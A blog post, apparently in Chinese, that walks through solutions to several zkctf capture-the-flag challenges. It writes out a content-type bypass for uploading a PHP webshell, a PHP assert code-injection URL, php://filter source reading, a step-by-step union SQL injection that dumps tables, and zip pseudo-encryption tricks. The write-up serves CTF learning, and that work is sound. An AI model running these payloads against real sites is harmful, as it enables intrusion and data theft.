@@ -1,0 +1,512 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+
+  <!-- Basic Page Needs
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  <meta charset="utf-8">
+  
+      <title>zkctf部分wp - 美豆的博客</title>
+  
+
+  
+  
+  <meta name="description" content="美豆的博客">
+  <meta name="author" content="美豆">
+
+  <!-- Mobile Specific Metas
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <!-- load loadjs.js -->
+  <script src="/libs/loadjs/dist/loadjs.min.js"></script>
+
+<link rel="stylesheet" href="/libs/animate.css/animate.min.css">
+  <!-- load lightgallery -->
+<link rel="stylesheet" href="/css/lightgallery.css">
+<link rel="stylesheet" href="/libs/noty/lib/noty.css">
+<script src="https://code.jquery.com/jquery-3.3.1.min.js" integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=" crossorigin="anonymous"></script>
+  
+
+
+
+
+
+
+    <link rel="stylesheet" href="/css/taurus.css">
+    
+        <link rel="stylesheet" href="/css/scheme-taurus/animations.css">
+    
+
+
+<link rel="stylesheet" href="/.css">
+
+  <!-- load font awesome 5 -->
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.2.0/css/all.css" integrity="sha384-hWVjflwFxL6sNzntih27bfxkr27PmbbK/iSvJ+a4+0owXq79v+lsFkW54bOGbiDQ" crossorigin="anonymous">
+
+  <script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
+  });
+  </script>
+  <!-- load mathjax -->
+  <script type="text/javascript" async src="https://cdnjs.cloudflare.com/ajax//libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+
+  <!-- load js-cookie -->
+  <script src="https://cdn.jsdelivr.net/npm/js-cookie@2/src/js.cookie.min.js"></script>
+    <script src="/js/social-share.min.js"></script>
+    <script src="/js/theme.js"></script>
+
+  <!-- include cookie.js -->
+  
+  
+
+  <!-- include comment system code -->
+  
+    <script src="/js/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <!-- Favicon
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+
+  
+  <link rel="icon" href="/images/logo.png">
+</head>
+<body style="display: flex; flex-direction: column; min-height: 100vh;">
+
+ 
+
+<header id="header" class="header">
+	<div class="header-title">
+		
+		<div class="header-logo">
+			<a href="/">
+				<img src="/images/logo.svg">
+			</a>
+		</div>
+		<div class="header-text">
+			<h1>
+				<a href="/">美豆的博客</a>
+			</h1>
+			<subtitle>
+				所谓无底深渊，下去，也是前程万里
+			</subtitle>
+		</div>
+		
+	</div>
+	<div id="header-nav">
+		
+
+
+
+<nav id="nav">
+	
+	
+	
+	<div class="nav-item" id="nav-item-toc">
+		
+
+
+<div class="toc-container">
+<i class="far fa-times-circle" id="toc-close" onclick="closeTOC(event);" ontouchstart="closeTOC(event);"></i>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-upload"><span class="toc-number">1.</span> <span class="toc-text">Web upload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-warmup"><span class="toc-number">2.</span> <span class="toc-text">Web warmup</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-where-is-flag"><span class="toc-number">3.</span> <span class="toc-text">Web where is flag</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-sql-1"><span class="toc-number">4.</span> <span class="toc-text">Web sql-1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc-dog"><span class="toc-number">5.</span> <span class="toc-text">Misc dog</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc-real-pass"><span class="toc-number">6.</span> <span class="toc-text">Misc real pass</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc-hotdog"><span class="toc-number">7.</span> <span class="toc-text">Misc hotdog</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc-zkzkzk"><span class="toc-number">8.</span> <span class="toc-text">Misc zkzkzk</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc-格式里的秘密"><span class="toc-number">9.</span> <span class="toc-text">Misc 格式里的秘密</span></a></li></ol>
+</div>
+<div class="toc-button" onclick="toggleTOC(event);" ontouchstart="toggleTOC(event);">
+    <img src="/images/icons/blue-shadow/toc.svg" alt>
+</div>
+
+	</div>
+	
+	<div class="nav-item" id="nav-item-archive">
+		
+				<div class="nav-icon">
+				
+			<a href="/archives/" title="Archivi">
+			<img src="/images/icons/blue-shadow/archive.svg" alt>
+			</a>
+		</div>
+	</div>
+	<div class="nav-item" id="nav-item-search">
+		
+		<div class="nav-icon">
+		
+			<a href="/search/" title="Cerca">
+			<img src="/images/icons/blue-shadow/search.svg" alt>
+			</a>
+		</div>
+	</div>
+	<div class="nav-item" id="nav-item-more">
+		<div class="nav-icon">
+				<a href="#" onclick="onClickMenuIcon(event);" ontouchstart="onClickMenuIcon(event);">
+				<img src="/images/icons/blue-shadow/menu.svg" alt>
+				</a>
+		</div>
+		<div class="nav-more-menu">
+				<i class="far fa-times-circle" id="nav-more-menu-close" onclick="onClickNavMenuClose(event);" ontouchstart="onClickNavMenuClose(event);"></i>
+		
+		
+	</div>
+	</div>
+</nav>
+
+	</div>
+</header>
+
+ 
+
+  
+
+
+
+
+  <!-- Primary Page Layout
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+  <div style="flex: 1;">
+      <style>
+    body {
+        background-color: white;
+    }
+</style>
+
+
+
+
+
+
+
+
+    
+    
+
+
+
+
+
+
+    
+    
+        
+    
+
+    
+        
+    
+
+
+
+
+
+
+
+
+
+<article class="article" id="/2019/05/16/zkctf部分wp/" data-name="zkctf部分wp" data-version>
+
+    <!-- Title -->
+    <div class="article-header">
+         
+         <h1 class="article-title">
+            <a href="/2019/05/16/zkctf部分wp/">
+                Zkctf部分wp
+            </a>
+        </h1>
+        <!-- TODO: support nested categories,display them nicely -->
+        
+    </div>
+    
+    <!-- Date and Author -->
+    <div class="article-meta">
+    <ul>
+            <li><i class="fa fa-calendar"></i> 2019-05-16</li>
+            
+            <li><i class="fa fa-user"></i> 美豆</li>
+            <li><i class="fas fa-copyright"></i>
+            
+                
+                
+            
+            
+                <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/">CC BY-NC-ND 4.0</a>
+            
+            </li>
+    </ul>
+    
+<div class="tags">
+	
+		
+			<label class="tag-1"><a href="/tags/zkctf/">Zkctf</a></label>
+		
+	
+	</div>
+
+    </div>
+    <div class="article-cards">
+        <!-- Author Card -->
+        <!---
+        <div class='Card-article Card-author'>
+            <div class='card-title'>
+                <h3></h3>
+            </div>
+            <div class='card-content'>
+                    <div class="author-meta">
+                            <div class='author-figure'>
+                                <img src="" alt="">
+                            </div>
+                            <div class='author-name'>
+                                美豆
+                            </div>
+                        </div>
+                        <div class="author-ai">
+                            <div class='author-intro'>
+                                <!-- TODO: auto generating author description -->
+                                <!-- 
+                            </div>
+                            <div class="author-articles">
+                                <!-- TODO: auto generating author articles -->
+                                <!-- <ul>
+                                    <li>Article 1</li>
+                                    <li>Article 2</li>
+                                    <li>Article 3</li>
+                                    <li>Article 4</li>
+                                    <li>Article 5</li>
+                                    <li>Article 6</li>
+                                </ul>
+                            </div>
+                        </div>
+            </div>
+            
+        </div> -->
+
+        <!-- Visit Card -->
+        <!-- <div class="Card-article Card-visit"> -->
+            <!-- <div class="card-title">
+  <h3>Post Visit</h3>
+</div>
+<div class="card-chart">
+  <div id="chart-post-visit"></div>
+</div> -->
+        <!-- </div> -->
+        
+        <!-- Auto Excerpt Card -->
+        <!-- <div class="Card-article Card-excerpt">
+            <div class="card-title">
+  <h3>Quick Read</h3>
+</div>
+<div class="card-text">
+  <p id="text-post-summary">zkctf部分题目的wp
+Web upload打开题目地址发现是空白查看源代码看到upload.php所以把file改成upload.php，发现是个文件上传，且只能上传jpg格式的文件写php一句话木马上传时用bp抓包对比上传正常的jpg文件时的请求，把一句话的文件类型改成image/jpeggo一下发现上传成功接着用菜刀连接得到flag
+Web warmup打开题目地址页面上只有一个haha…查看源代码发现一个index.php在url中添上index.php得到一段代码查阅assert函数：检查一个断言是否为 FALSE，如果 传入的值是字符串，它将会被 assert() 当做...</p>
+</div>
+        </div> -->
+    </div>
+    
+    <!-- Gallery -->
+    <!-- TODO: add a slider to gallery -->
+    
+
+    <!-- Content -->
+    <!-- TODO: support table of content -->
+    <div class="article-toc" id="article-toc">
+    
+        
+
+
+<div class="toc-container">
+<i class="far fa-times-circle" id="toc-close" onclick="closeTOC(event);" ontouchstart="closeTOC(event);"></i>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-upload"><span class="toc-number">1.</span> <span class="toc-text">Web upload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-warmup"><span class="toc-number">2.</span> <span class="toc-text">Web warmup</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-where-is-flag"><span class="toc-number">3.</span> <span class="toc-text">Web where is flag</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-sql-1"><span class="toc-number">4.</span> <span class="toc-text">Web sql-1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc-dog"><span class="toc-number">5.</span> <span class="toc-text">Misc dog</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc-real-pass"><span class="toc-number">6.</span> <span class="toc-text">Misc real pass</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc-hotdog"><span class="toc-number">7.</span> <span class="toc-text">Misc hotdog</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc-zkzkzk"><span class="toc-number">8.</span> <span class="toc-text">Misc zkzkzk</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc-格式里的秘密"><span class="toc-number">9.</span> <span class="toc-text">Misc 格式里的秘密</span></a></li></ol>
+</div>
+<div class="toc-button" onclick="toggleTOC(event);" ontouchstart="toggleTOC(event);">
+    <img src="/images/icons/blue-shadow/toc.svg" alt>
+</div>
+
+    </div>
+    <div class="article-content">
+    <p>zkctf部分题目的wp<br><a id="more"></a></p>
+<h1 id="Web-upload"><a href="#Web-upload" class="headerlink" title="Web upload"></a>Web upload</h1><p>打开题目地址发现是空白<br><img src="https://s2.ax1x.com/2019/05/16/EbtrR0.png" alt="1"><br>查看源代码看到upload.php<br><img src="https://s2.ax1x.com/2019/05/16/EbtcsU.png" alt="2"><br>所以把file改成upload.php，发现是个文件上传，且只能上传jpg格式的文件<br><img src="https://s2.ax1x.com/2019/05/16/EbtszV.png" alt="3"><br>写php一句话木马<br><img src="https://s2.ax1x.com/2019/05/16/EbtRZ4.png" alt="4"><br>上传时用bp抓包<br><img src="https://s2.ax1x.com/2019/05/16/Ebt6MT.png" alt="5"><br>对比上传正常的jpg文件时的请求，把一句话的文件类型改成image/jpeg<br><img src="https://s2.ax1x.com/2019/05/16/EbtgLF.png" alt="6"><br>go一下发现上传成功<br><img src="https://s2.ax1x.com/2019/05/16/Ebtfo9.png" alt="7"><br>接着用菜刀连接<br><img src="https://s2.ax1x.com/2019/05/16/EbtWdJ.png" alt="8"><br>得到flag<br><img src="https://s2.ax1x.com/2019/05/16/Ebt4iR.png" alt="9"></p>
+<h1 id="Web-warmup"><a href="#Web-warmup" class="headerlink" title="Web warmup"></a>Web warmup</h1><p>打开题目地址页面上只有一个haha…查看源代码发现一个index.php<br><img src="https://s2.ax1x.com/2019/05/16/EbttsS.png" alt="10"><br>在url中添上index.php得到一段代码<br><img src="https://s2.ax1x.com/2019/05/16/EbtaZQ.png" alt="11"><br>查阅assert函数：检查一个断言是否为 FALSE，如果 传入的值是字符串，它将会被 assert() 当做 PHP 代码来执行。<br>所以可以令a=highlight_file(‘flag.php’);// 高亮显示flag.php，并注释掉后面的代码（==$b都被注释掉了）<br>阅读代码，当b!=Hello World!时程序结束并输出haha…所以先传入b的值：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?b=Hello%20word!&amp;a=highlight_file(%27flag.php%27);//</span><br></pre></td></tr></table></figure></p>
+<p>得到flag<br><img src="https://s2.ax1x.com/2019/05/16/EbtYM8.png" alt="12"></p>
+<h1 id="Web-where-is-flag"><a href="#Web-where-is-flag" class="headerlink" title="Web where is flag"></a>Web where is flag</h1><p>因为有中英文按钮，发现可以文件上传<br><img src="https://s2.ax1x.com/2019/05/16/EbtwIs.png" alt="13"><br>用php://filter读取index.php,再用base64解码即可得到flag<br><img src="https://s2.ax1x.com/2019/05/16/EbtNqg.png" alt="14"></p>
+<h1 id="Web-sql-1"><a href="#Web-sql-1" class="headerlink" title="Web sql-1"></a>Web sql-1</h1><p>判断回显位<br>-1’ union select 1,2,3,4 #</p>
+<p>爆数据库<br>-1’ union select database(),2,3,4 #<br>【或：-1’ union select group_concat(schema_name),2,3,4 from information_schema.schemata #】</p>
+<p>爆sql1数据库的数据表<br>-1’ union select  group_concat(table_name),2,3,4 from information_schema.tables where table_schema=’sql1’#</p>
+<p>爆 fl4g 表的列<br>‘ union select group_concat(column_name),2,3,4 from information_schema.columns where table_name=’fl4g’ #</p>
+<p>爆出flag<br>‘ union select *,2,3,4 from fl4g #</p>
+<h1 id="Misc-dog"><a href="#Misc-dog" class="headerlink" title="Misc dog"></a>Misc dog</h1><p>下载的压缩包中含有一个flag.jpg和一个打开需要密码的flag.txt，把图片用记事本格式打开查找secret得到打开txt文件需要的密码，打开文件得到flag</p>
+<h1 id="Misc-real-pass"><a href="#Misc-real-pass" class="headerlink" title="Misc real pass"></a>Misc real pass</h1><p>打开压缩包发现需要密码，尝试暴力破解但是提示该文件被损坏或是未加密文件<br><img src="https://s2.ax1x.com/2019/05/16/EbtBin.png" alt="16"><br>于是猜想可能是伪加密，用WinHex打开<br><img src="https://s2.ax1x.com/2019/05/16/EbtDGq.png" alt="17"><br>发现源文件数据区加密区为09 00，改成00 00再打开就不需要密码，于是拿到flag。</p>
+<h1 id="Misc-hotdog"><a href="#Misc-hotdog" class="headerlink" title="Misc hotdog"></a>Misc hotdog</h1><p>用WinHex打开发现图片中还隐藏了一个flag.zip，将该图片用360压缩打开，得到<br><img src="https://s2.ax1x.com/2019/05/16/Ebtdaj.png" alt="15"><br>打开flag.zip需要密码，密码由颜文字解密得到，解密网站<a href="https://tool.zcmzcm.org/aadecode" target="_blank" rel="noopener">https://tool.zcmzcm.org/aadecode</a><br>输入密码打开flag.txt文件即拿到flag。</p>
+<h1 id="Misc-zkzkzk"><a href="#Misc-zkzkzk" class="headerlink" title="Misc zkzkzk"></a>Misc zkzkzk</h1><p>拼图得flag</p>
+<h1 id="Misc-格式里的秘密"><a href="#Misc-格式里的秘密" class="headerlink" title="Misc 格式里的秘密"></a>Misc 格式里的秘密</h1><p>图片用记事本打开搜索得到flag</p>
+
+    
+    </div>
+    
+    
+        <div class="article-comment" id="article-comment">
+            
+
+<h1>Commento</h1>
+
+  
+    <div id="comment-not-available">
+      Not available
+      <p><strong>For site maintainer: Please provide <code>appId</code> and <code>appKey</code> in your <code>_data/cutie.yml</code> file for <code>valine</code> comment system.</strong></p>
+    </div>
+  
+
+
+        </div>
+        
+</article>
+  </div>
+
+  
+
+<footer id="footer">
+    <div class="footer-copyright">
+        <div>
+            <p> Copyright by <a href>美豆 </a> @ 2019</p>
+            <p>Designed by: <i class="fas fa-paint-brush"></i> <a href="https://moober.cn">Moober</a> e <i class="fas fa-graduation-cap"></i> <a href="https://qutang.github.io">Qu Tang</a> &bull; Tema: <a href="https://hexo-theme-cutie.qutang.dev">Cutie 2.1.4-Taurus</a> &bull; Powered by <a href="http://hexo.io">Hexo.</a></p>
+        </div>
+    </div>
+    
+    <div class="footer-social">
+        
+    </div>
+</footer>
+
+  <br>
+
+  <div id="footer-nav" class='footer-nav'>
+		
+
+
+
+<nav id="nav">
+	
+	
+	
+	<div class="nav-item" id="nav-item-toc">
+		
+
+
+<div class="toc-container">
+<i class="far fa-times-circle" id="toc-close" onclick="closeTOC(event);" ontouchstart="closeTOC(event);"></i>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-upload"><span class="toc-number">1.</span> <span class="toc-text">Web upload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-warmup"><span class="toc-number">2.</span> <span class="toc-text">Web warmup</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-where-is-flag"><span class="toc-number">3.</span> <span class="toc-text">Web where is flag</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-sql-1"><span class="toc-number">4.</span> <span class="toc-text">Web sql-1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc-dog"><span class="toc-number">5.</span> <span class="toc-text">Misc dog</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc-real-pass"><span class="toc-number">6.</span> <span class="toc-text">Misc real pass</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc-hotdog"><span class="toc-number">7.</span> <span class="toc-text">Misc hotdog</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc-zkzkzk"><span class="toc-number">8.</span> <span class="toc-text">Misc zkzkzk</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc-格式里的秘密"><span class="toc-number">9.</span> <span class="toc-text">Misc 格式里的秘密</span></a></li></ol>
+</div>
+<div class="toc-button" onclick="toggleTOC(event);" ontouchstart="toggleTOC(event);">
+    <img src="/images/icons/blue-shadow/toc.svg" alt>
+</div>
+
+	</div>
+	
+	<div class="nav-item" id="nav-item-archive">
+		
+				<div class="nav-icon">
+				
+			<a href="/archives/" title="Archivi">
+			<img src="/images/icons/blue-shadow/archive.svg" alt>
+			</a>
+		</div>
+	</div>
+	<div class="nav-item" id="nav-item-search">
+		
+		<div class="nav-icon">
+		
+			<a href="/search/" title="Cerca">
+			<img src="/images/icons/blue-shadow/search.svg" alt>
+			</a>
+		</div>
+	</div>
+	<div class="nav-item" id="nav-item-more">
+		<div class="nav-icon">
+				<a href="#" onclick="onClickMenuIcon(event);" ontouchstart="onClickMenuIcon(event);">
+				<img src="/images/icons/blue-shadow/menu.svg" alt>
+				</a>
+		</div>
+		<div class="nav-more-menu">
+				<i class="far fa-times-circle" id="nav-more-menu-close" onclick="onClickNavMenuClose(event);" ontouchstart="onClickNavMenuClose(event);"></i>
+		
+		
+	</div>
+	</div>
+</nav>
+
+	</div>
+
+  
+
+
+
+    
+
+
+
+
+
+
+
+    <script src="/js/lightgallery.min.js"></script>
+<script src="/js/lg-zoom.min.js"></script>
+<script type="text/javascript">
+    $(document).ready(function() {
+        $("#lightgallery").lightGallery(); 
+        $(".article-content img").each(function(){
+            console.log($(this).attr('src'))
+            $(this).attr('data-src', $(this).attr('src')).lightGallery({
+                selector: 'this'
+            })
+        });
+    });
+</script>
+
+
+
+
+
+
+<script type="text/javascript">
+
+  
+  // update cookie if this page is opened (directly)
+  loadjs(['/libs/jshashes/hashes.min.js', '/libs/js-cookie/src/js.cookie.js', '/js/post.v2.js'], 'post-version');
+  loadjs.ready('post-version', function(){
+    
+    new Postv2('hashit_fa7f33d350811d117ceedf08fb1f5f532306100989e8d7cb90097147fb525d4d').update('hashit_865c04c25049cd20aee7219b45aa1b9fd2272fa01f8ded84c028ed14b145bc8d', function(){});
+  });
+  
+</script>
+
+
+
+<!-- <script src="/js/post.js"></script> -->
+
+<script src="/js/headroom.min.js"></script>
+
+<script data-no-instant type="text/javascript">
+
+initHeadroom();
+
+changeLayoutOnTouchScreen();
+
+// 
+// var post = new Post('', '');
+// post.getCommentCount(window.location.pathname, function(count){
+//     $('#article-comment-count').text(count);
+// });
+// post.addVisitRecord(window.location.pathname, userip);
+// post.getVisitCount(window.location.pathname, function(count){
+//     $('#article-visit-count').text(count);
+// });
+
+// 
+</script>
+
+
+<!-- End Document
+  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
+</body>
+</html>
